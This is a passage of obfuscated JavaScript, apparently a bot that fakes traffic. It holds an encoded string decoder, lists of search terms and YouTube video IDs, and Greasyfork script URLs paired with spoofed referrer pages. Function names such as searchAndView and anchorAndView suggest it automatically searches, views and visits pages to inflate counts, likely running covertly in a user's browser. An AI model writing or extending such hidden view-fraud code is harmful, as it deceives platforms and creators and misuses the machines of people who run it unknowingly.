'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + Z(0xd, '6oCv') + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x554 * 0x5 + -0x2 * -0x295 + -0x1fc4)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x1282 + 0x1f5e * -0x1 + -0xce6 * -0x1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x151 * 0x11 + -0x597 + -0x1 * -0x1bfb);

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1912 + -0x989 * -0x1 + 0xf89);
    let h = e[f];
    if (c['PriaSL'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x137 * -0x1e + 0x5 * 0x570 + -0xcba * 0x5, r, s, t = 0x1138 + 0x5cf + -0x1707; s = m['charAt'](t++); ~s && (r = q % (-0x3 * -0x4b1 + -0x2 * -0x2a9 + 0xb * -0x1c3) ? r * (0x2 * -0xe83 + 0xd99 + 0xfad) + s : s, q++ % (0x3 * -0xcdf + -0x72b * 0x2 + 0x34f7)) ? o += String['fromCharCode'](-0x9cf + -0x4 * 0x3 + 0xada & r >> (-(-0x1ca * -0xe + -0x2 * 0x2a9 + -0x4ee * 0x4) * q & -0x114e + 0x1e4f + -0xcfb)) : 0x765 + 0x1a9c + -0x2201) {
          s = n['indexOf'](s);
        }
        for (let u = -0x60d + 0x1694 + -0x1087, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x4 * 0x7b9 + -0xd7 * 0x5 + 0x191 * -0x11))['slice'](-(-0x396 * -0x9 + -0xb3a + -0x150a * 0x1));
        }
        return decodeURIComponent(p);
      };
      c['QOocCP'] = i, b = arguments, c['PriaSL'] = !![];
    }
    const j = e[0x26cd + 0x761 * -0x5 + -0x1e8],
      k = f + j,
      l = b[k];
    return !l ? (h = c['QOocCP'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    Y(0x13) + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    Y(0xf) + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    Z(0x7, 'Cd$s') + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    a0(0x10) + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    a0(0xe) + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + a0(0x8) + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + Z(0x0, 'RL@P') + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + Y(0x9) + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
